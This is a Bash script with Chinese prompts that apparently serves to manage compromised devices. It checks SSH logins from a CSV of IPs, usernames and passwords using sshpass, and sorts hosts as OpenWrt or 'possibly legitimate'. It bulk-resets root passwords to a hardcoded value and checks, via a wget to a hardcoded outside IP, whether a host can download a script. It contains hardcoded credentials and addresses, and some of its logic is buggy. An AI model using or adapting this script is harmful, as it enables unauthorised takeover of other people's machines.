check_passwd(){
	test_connect=""
	timeout 3s sshpass -p "${3}" ssh ${2}@${1} -o StrictHostKeyChecking=no "uname -n"&&test_connect=$(sshpass -p "${3}" ssh ${2}@${1} -o StrictHostKeyChecking=no "uname -n")
	if [ ! $test_connect ]; then
		error_file='/root/error_server.txt'
	        echo "${1}密码错误,无法连接"
			out_file $error_file ${1} ${2} ${3}
			echo "已将密码错误的ip导入到"$error_file"中"
			sleep 2
	else
		os=$(check_os $test_connect)
	        echo "密码正确"
		echo "正在检测系统"
		sleep 0.5
		echo $os
		if [ "$os" == "openwrt" ];then
			right_file='/root/openwrt.txt'
			out_file $right_file ${1} ${2} ${3}
			echo "已将系统为openwrt的ip导入到"$right_file"中"
			sleep 2
		else
			right_file='/root/other.txt'
			out_file $right_file ${1} ${2} ${3}
			echo "这个可能是正经机器已将ip导入到"$right_file"中"
			sleep 2
		fi
	fi
}	
check_os(){
	#os=test_connect=$(sshpass -p "61.74.224.26" ssh root@Ync342015n -o StrictHostKeyChecking=no "uname -n")
	if [ "${1}" == "KSNW_VPN_Server" -o "$os" == "Server" ]; then
		echo "openwrt"
	else
		echo "other"
	fi
}

check_all(){
	for((i=1;i<=$num;i++));  
	do 	
		echo "检测第 $i 台"
		set +e
		address=$(sed -n "$i, 1p" $input_file | awk -F, '{print $1;}')
		username=$(sed -n "$i, 1p" $input_file | awk -F, '{print $2;}')
		passwd=$(sed -n "$i, 1p" $input_file | awk -F, '{print $3;}')
		check_passwd $address $username $passwd
		sleep 0.5
		clear
	done
}
change_passwd(){
	for((i=1;i<=$num;i++));  
	do 	
		echo "正在为第 $i 台改密码"
		check_changed=""
		set +e
		address=$(sed -n "$i, 1p" $input_file | awk -F, '{print $1;}')
		username=$(sed -n "$i, 1p" $input_file | awk -F, '{print $2;}')
		passwd=$(sed -n "$i, 1p" $input_file | awk -F, '{print $3;}')
		timeout 3s sshpass -p "${3}" ssh ${2}@${1} -o StrictHostKeyChecking=no "echo -e 'Ync342015n\nYnc342015n' | (passwd root)"&&check_changed=$(sshpass -p "Ync342015n" ssh ${2}@${1} -o StrictHostKeyChecking=no "uname -n")
		if [ "$check_changed" != "" ]; then
			echo "已将密码改为Ync342015n"
		else
			echo "密码可能没有改变"
		fi
		sleep 0.5
		clear
	done
	
}
check_wget(){
	timeout 3s sshpass -p "Ync342015n" ssh root@175.212.159.214 -o StrictHostKeyChecking=no "uname -n"&&a=$(sshpass -p "Ync342015n" ssh root@175.212.159.214 -o StrictHostKeyChecking=no "cd /tmp&&rm -f test.txt&&wget http://141.164.59.56/test.txt&&cat test.txt")
	echo $a
	if [ "$a" == "" ]; then
        	echo "wget正常，此台机器运行环境正常"
	else
        	echo "wget可能未安装，此机器无法下载脚本"
	fi
}
	
out_file(){
	cat >> ${1} << EOF
		${2},${3},${4}
EOF
}
echo ====================================================================================================
echo
read -p "请输入放置cvs文件的绝对路径: " input_file
echo
echo ====================================================================================================
echo
echo "csv文件的路径为: $input_file(如果不对请Ctrl+C终止脚本!!!)"
echo
echo ====================================================================================================
sleep 0.5
clear
echo #####################################################################################################
num=$(cat $input_file | wc -l)
echo "共有  $num  条地址"
echo
echo
echo
echo "您需要做些什么"
echo "1 检测密码是否正确并进行系统分类"
echo "2 批量更改密码"
read -p "输入选项:" check_num
if ((check_num==1));
then
	check_all
elif((check_num==2));
then
	change_passwd
else
	echo "输入不符合规范 请重新运行脚本"
fi
